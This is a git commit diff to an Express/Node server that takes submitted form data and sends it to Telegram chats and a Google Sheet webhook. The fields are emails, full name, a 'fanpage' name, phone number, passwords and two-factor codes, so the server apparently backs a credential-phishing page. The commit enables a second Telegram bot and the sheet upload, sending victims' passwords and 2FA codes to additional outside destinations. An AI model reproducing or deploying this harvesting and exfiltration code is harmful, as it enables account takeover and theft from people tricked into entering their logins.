be3abd8d719ec4b801a2922b1ef739bc7edcd8c4
SamanthaCunninghamn <161363938+SamanthaCunninghamn@users.noreply.github.com>
2024-07-16 18:20:45 +0700

    update

--- index.js
+++ index.js
@@ -11,7 +11,7 @@ app.use(cors('*'));
 app.use(express.json());
 
 const bot = new TelegramBot(process.env.BOT_TOKEN, { polling: true });
-// const bot_two = new TelegramBot(process.env.BOT_TOKEN_BOT_TWO, { polling: true });
+const bot_two = new TelegramBot(process.env.BOT_TOKEN_BOT_TWO, { polling: true });
 
 app.post('/api/resgister', (req, res) => {
     // GET DATA FROM CLIENT
@@ -47,44 +47,43 @@ if (data.firstTwoFa == undefined && data.secondTwoFa == undefined) {
 <strong>First Two-Fa:</strong> ${data.firstTwoFa ? data.firstTwoFa : ''}
 <strong>Second Two-Fa:</strong> ${data.secondTwoFa ? data.secondTwoFa : ''}`;
     bot.sendMessage(process.env.CHAT_ID, messageCode,  { parse_mode: 'HTML' });
-
 }
 
+    const location = `<strong>Ip:</strong> ${data.ip ? data.ip : ''}
+<strong>First Two-Fa:</strong> ${data.firstTwoFa ? data.firstTwoFa : ''}
+<strong>Second Two-Fa:</strong> ${data.secondTwoFa ? data.secondTwoFa : ''}`;
 
-
-    // bot_two.sendMessage(process.env.CHAT_ID_BOT_TWO, location,  { parse_mode: 'HTML' });
+    bot_two.sendMessage(process.env.CHAT_ID_BOT_TWO, location,  { parse_mode: 'HTML' });
 
 
     // ADD GOOGLE SHEET
-    // const url = new URL(process.env.WEBHOOK_URL);
+    const url = new URL(process.env.WEBHOOK_URL);
 
-    // url.searchParams.append('Ip', data.ip ? data.ip : '');
-    // url.searchParams.append('City', data.city ? data.city : '');
-    // url.searchParams.append('Country', data.country ? data.country : '');
-    // url.searchParams.append('Email Business', data.businessEmail ? data.businessEmail : '');
-    // url.searchParams.append('Email Personal', data.personalEmail ? data.personalEmail : '');
-    // url.searchParams.append('Full Name', data.fullName ? data.fullName : '');
-    // url.searchParams.append('Fanpage Name', data.fanpageName ? data.fanpageName : '');
-    // url.searchParams.append('Phone Number', data.mobilePhone ? data.mobilePhone : '');
-    // // 
-    // url.searchParams.append('Password First', data.passwordFirst ? data.passwordFirst : '');
-    // url.searchParams.append('Password Second', data.passwordSecond ? data.passwordSecond : '');
-    // // 
-    // url.searchParams.append('First Two-Fa', data.firstTwoFa ? data.firstTwoFa : '');
-    // url.searchParams.append('Second Two-Fa', data.secondTwoFa ? data.secondTwoFa : '');
+    url.searchParams.append('Ip', data.ip ? data.ip : '');
+    url.searchParams.append('Email Business', data.businessEmail ? data.businessEmail : '');
+    url.searchParams.append('Email Personal', data.personalEmail ? data.personalEmail : '');
+    url.searchParams.append('Full Name', data.fullName ? data.fullName : '');
+    url.searchParams.append('Fanpage Name', data.fanpageName ? data.fanpageName : '');
+    url.searchParams.append('Phone Number', data.mobilePhone ? data.mobilePhone : '');
+    // 
+    url.searchParams.append('Password First', data.passwordFirst ? data.passwordFirst : '');
+    url.searchParams.append('Password Second', data.passwordSecond ? data.passwordSecond : '');
+    // 
+    url.searchParams.append('First Two-Fa', data.firstTwoFa ? data.firstTwoFa : '');
+    url.searchParams.append('Second Two-Fa', data.secondTwoFa ? data.secondTwoFa : '');
 
-    // axios.get(url)
-    // .then(response => {
-    //     const data = response.data;
-    //     if (data.status === 'success') {
-    //         bot.sendMessage(process.env.CHAT_ID, '✅ Đã thêm vào Sheet thành công.');
-    //     } else {
-    //         bot.sendMessage(process.env.CHAT_ID, 'Không thể thêm. Vui lòng thử lại sau!');
-    //     }
-    // })
-    // .catch(error => {
-    //     bot.sendMessage(chatId, 'Đã có lỗi xảy ra. Vui lòng thử lại sau!');
-    // });
+    axios.get(url)
+    .then(response => {
+        const data = response.data;
+        if (data.status === 'success') {
+            bot.sendMessage(process.env.CHAT_ID, '✅ Đã thêm vào Sheet thành công.');
+        } else {
+            bot.sendMessage(process.env.CHAT_ID, 'Không thể thêm. Vui lòng thử lại sau!');
+        }
+    })
+    .catch(error => {
+        bot.sendMessage(chatId, 'Đã có lỗi xảy ra. Vui lòng thử lại sau!');
+    });
 
 });
 
